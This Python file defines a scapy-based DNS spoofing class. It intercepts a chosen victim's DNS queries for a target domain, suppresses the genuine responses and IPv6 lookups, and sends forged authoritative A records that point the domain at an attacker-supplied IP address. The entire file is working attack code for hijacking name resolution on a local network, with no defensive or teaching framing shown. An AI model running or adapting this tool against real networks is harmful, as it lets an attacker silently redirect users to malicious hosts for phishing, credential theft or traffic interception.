from scapy.all import IP, UDP, DNS, TCP, DNSQR, DNSRR, send
from scapy.layers.inet6 import IPv6


class DNSSpoofer:
    def __init__(self, interface, victim_ip, domain_to_spoof,
                 attacker_ip, attacker_ipv6=None, logger=None):
        self.interface = interface
        self.victim_ip = victim_ip
        self.domain_to_spoof = domain_to_spoof
        self.attacker_ip = attacker_ip
        self.attacker_ipv6 = attacker_ipv6
        self.logger = logger

    def dns_spoofer(self, packet):
        # Block real DNS replies going TO victim
        if packet.haslayer(DNS) and packet.haslayer(UDP):
            dns = packet[DNS]

            # DNS response (qr = 1) destined for victim
            if dns.qr == 1:
                if packet.haslayer(IP) and packet[IP].dst == self.victim_ip:
                    # Drop real DNS response
                    return True

        # Only UDP DNS
        if not packet.haslayer(DNS) or not packet.haslayer(UDP):
            return False

        dns = packet[DNS]

        # Only DNS queries
        if dns.qr != 0 or dns.qdcount == 0:
            return False

        # IP version
        if packet.haslayer(IP):
            ip_cls = IP
            src = packet[IP].src
            dst = packet[IP].dst
        elif packet.haslayer(IPv6):
            ip_cls = IPv6
            src = packet[IPv6].src
            dst = packet[IPv6].dst
        else:
            return False

        if src != self.victim_ip:
            return False

        qname = dns.qd.qname
        qtype = dns.qd.qtype

        domain = qname.decode(errors="ignore").rstrip(".").lower()

        if domain != self.domain_to_spoof.lower():
            return False

        # A or AAAA only
        if qtype == 1:          # A
            rdata = self.attacker_ip
            rrtype = "A"
        elif qtype == 28:  # AAAA
            return True   # DROP it, do not forward, do not reply
        else:
            return True # Drop this as well

        reply = (
            ip_cls(src=dst, dst=src) /
            UDP(sport=53, dport=packet[UDP].sport) /
            DNS(
                id=dns.id,
                qr=1,
                aa=1,
                ra=1,
                rcode=0,
                qd=dns.qd,
                an=DNSRR(
                    rrname=qname,
                    type=rrtype,
                    ttl=300,
                    rdata=rdata
                )
            )
        )

        send(reply, iface=self.interface, verbose=0)
        self.logger(f"[DNS] Spoofed {qname.decode().rstrip('.')} → {rdata}")
        return True
